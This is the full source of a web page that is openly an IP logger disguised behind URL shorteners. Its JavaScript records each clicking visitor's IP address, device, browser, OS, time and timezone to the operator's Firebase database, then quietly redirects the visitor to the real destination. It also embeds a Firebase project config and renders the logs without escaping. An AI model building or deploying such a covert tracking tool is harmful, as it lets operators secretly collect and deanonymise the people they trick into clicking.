<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Cyberpunk IP Logger + URL Shortener</title>

<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Inter:wght@300;400;600&display=swap');

  body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: radial-gradient(circle at top left, #0a0014, #000);
    color: #e0e0ff;
    overflow-x: hidden;
  }

  /* Animated neon grid background */
  body::before {
    content: "";
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, rgba(255,0,255,0.1) 1px, transparent 1px),
                linear-gradient(0deg, rgba(0,200,255,0.1) 1px, transparent 1px);
    background-size: 40px 40px;
    animation: gridMove 20s linear infinite;
    z-index: -1;
  }

  @keyframes gridMove {
    from { transform: translateY(0); }
    to { transform: translateY(-200px); }
  }

  h2 {
    font-family: 'Orbitron', sans-serif;
    font-size: 32px;
    margin-top: 40px;
    text-shadow: 0 0 15px #7a00ff;
  }

  .card {
    background: rgba(20, 0, 40, 0.6);
    backdrop-filter: blur(12px);
    border: 1px solid rgba(120, 0, 255, 0.4);
    box-shadow: 0 0 25px rgba(120, 0, 255, 0.3);
    padding: 25px;
    border-radius: 16px;
    width: 480px;
    margin: 40px auto;
    animation: fadeIn 1.2s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
  }

  input, select {
    width: 90%;
    padding: 12px;
    margin-top: 12px;
    border-radius: 10px;
    border: 1px solid rgba(120, 0, 255, 0.4);
    background: rgba(30, 0, 60, 0.6);
    color: #e0e0ff;
    font-size: 15px;
    transition: 0.3s;
  }

  input:focus, select:focus {
    outline: none;
    box-shadow: 0 0 12px #7a00ff;
  }

  button {
    margin-top: 20px;
    padding: 12px 25px;
    border: none;
    background: linear-gradient(90deg, #7a00ff, #00c8ff);
    color: white;
    border-radius: 10px;
    cursor: pointer;
    font-size: 18px;
    font-family: 'Orbitron', sans-serif;
    transition: 0.3s;
  }

  button:hover {
    transform: scale(1.05);
    box-shadow: 0 0 20px #7a00ff;
  }

  #ipBox {
    margin-top: 35px;
    padding: 25px;
    background: rgba(20, 0, 40, 0.6);
    border-radius: 16px;
    width: 800px;
    margin-left: auto;
    margin-right: auto;
    box-shadow: 0 0 25px rgba(0, 200, 255, 0.3);
    animation: fadeIn 1.4s ease;
  }

  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
    font-size: 14px;
  }

  th, td {
    border-bottom: 1px solid rgba(120, 0, 255, 0.3);
    padding: 8px;
  }

  th {
    background: rgba(120, 0, 255, 0.2);
    font-family: 'Orbitron', sans-serif;
  }

  a {
    color: #00c8ff;
    text-shadow: 0 0 10px #00c8ff;
  }
</style>
</head>

<body>

<h2>CYBERPUNK TRACKING LINK GENERATOR</h2>

<div class="card">
  <input id="url" type="text" placeholder="Destination URL">
  <input id="slug" type="text" placeholder="Custom ID (optional)">

  <select id="shortener">
    <option value="tinyurl">TinyURL</option>
    <option value="isgd">is.gd</option>
    <option value="vgd">v.gd</option>
    <option value="tly">T.LY (requires API key)</option>
  </select>

  <button onclick="makeLink()">Generate Link</button>

  <p id="output"></p>
</div>

<div id="ipBox">
  <h3 style="font-family: 'Orbitron'; text-shadow: 0 0 10px #00c8ff;">Logged IPs</h3>
  <div id="ipTableContainer">Loading...</div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>

<script>
// -------------------------------
// FIREBASE CONFIG
// -------------------------------
const firebaseConfig = {
  apiKey: "AIzaSyCh05Jp95UGx2UZiJhjMjiZ6LZAl7908eM",
  authDomain: "ip-logger-27238.firebaseapp.com",
  databaseURL: "https://ip-logger-27238-default-rtdb.firebaseio.com",
  projectId: "ip-logger-27238",
  storageBucket: "ip-logger-27238.appspot.com",
  messagingSenderId: "691731801990",
  appId: "1:691731801990:web:e91f751d7ea72a9ba46e07",
  measurementId: "G-HFK1GMT07P"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// -------------------------------
// TRACKING LINK HANDLER
// -------------------------------
const params = new URLSearchParams(window.location.search);
const id = params.get("track");

if (id) {
  db.ref("links/" + id).once("value").then(snap => {
    const data = snap.val();
    if (!data || !data.url) return;

    const destination = data.url;

    fetch("https://api.ipify.org/?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ip = ipData.ip;
        const info = getDeviceInfo();
        const time = new Date().toLocaleString();
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        db.ref("logs").push({
          ip,
          device: info.device,
          browser: info.browser,
          os: info.os,
          time,
          timezone,
          linkId: id,
          destination
        });

        setTimeout(() => {
          window.location.href = destination;
        }, 1200);
      });
  });
}

// -------------------------------
// DEVICE INFO
// -------------------------------
function getDeviceInfo() {
  const ua = navigator.userAgent;
  return {
    device: /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop",
    browser: ua.includes("Chrome") ? "Chrome" :
             ua.includes("Safari") ? "Safari" :
             ua.includes("Firefox") ? "Firefox" :
             ua.includes("Edg") ? "Edge" : "Unknown",
    os: ua.includes("Windows") ? "Windows" :
        ua.includes("Mac") ? "MacOS" :
        ua.includes("Android") ? "Android" :
        ua.includes("iPhone") || ua.includes("iPad") ? "iOS" : "Unknown"
  };
}

// -------------------------------
// MULTI URL SHORTENER
// -------------------------------
async function makeLink() {
  const realURL = document.getElementById("url").value.trim();
  let slug = document.getElementById("slug").value.trim();
  const shortener = document.getElementById("shortener").value;

  if (!realURL) {
    alert("Enter a destination URL.");
    return;
  }

  if (!slug) {
    slug = "id_" + Math.random().toString(36).substring(2, 8);
  }

  db.ref("links/" + slug).set({ url: realURL });

  const fullTrackingLink = window.location.origin + "/iplogger/?track=" + slug;

  let shortLink = "";

  if (shortener === "tinyurl") {
    shortLink = await fetch(
      "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(fullTrackingLink)
    ).then(res => res.text());
  }

  else if (shortener === "isgd") {
    shortLink = await fetch(
      "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(fullTrackingLink)
    ).then(res => res.text());
  }

  else if (shortener === "vgd") {
    shortLink = await fetch(
      "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(fullTrackingLink)
    ).then(res => res.text());
  }

  else if (shortener === "tly") {
    const apiKey = "YOUR_TLY_API_KEY";
    const response = await fetch("https://t.ly/api/v1/link/shorten", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": apiKey
      },
      body: JSON.stringify({
        long_url: fullTrackingLink,
        domain: "https://t.ly/"
      })
    }).then(res => res.json());

    shortLink = response.short_url;
  }

  document.getElementById("output").innerHTML =
    "Shortened Link (" + shortener + "):<br><a href='" + shortLink + "'>" + shortLink + "</a><br><br>" +
    "Full Tracking Link:<br><a href='" + fullTrackingLink + "'>" + fullTrackingLink + "</a>";
}

// -------------------------------
// DISPLAY LOGS
// -------------------------------
db.ref("logs").on("value", snap => {
  const logs = snap.val();
  if (!logs) {
    document.getElementById("ipTableContainer").innerHTML = "No logs yet.";
    return;
  }

  let html = "<table><tr><th>IP</th><th>Device</th><th>Browser</th><th>OS</th><th>Time</th><th>Timezone</th><th>Link ID</th></tr>";
  Object.keys(logs).reverse().forEach(key => {
    const l = logs[key];
    html += `<tr>
      <td>${l.ip}</td>
      <td>${l.device}</td>
      <td>${l.browser}</td>
      <td>${l.os}</td>
      <td>${l.time}</td>
      <td>${l.timezone}</td>
      <td>${l.linkId}</td>
    </tr>`;
  });
  html += "</table>";

  document.getElementById("ipTableContainer").innerHTML = html;
});
</script>

</body>
</html>
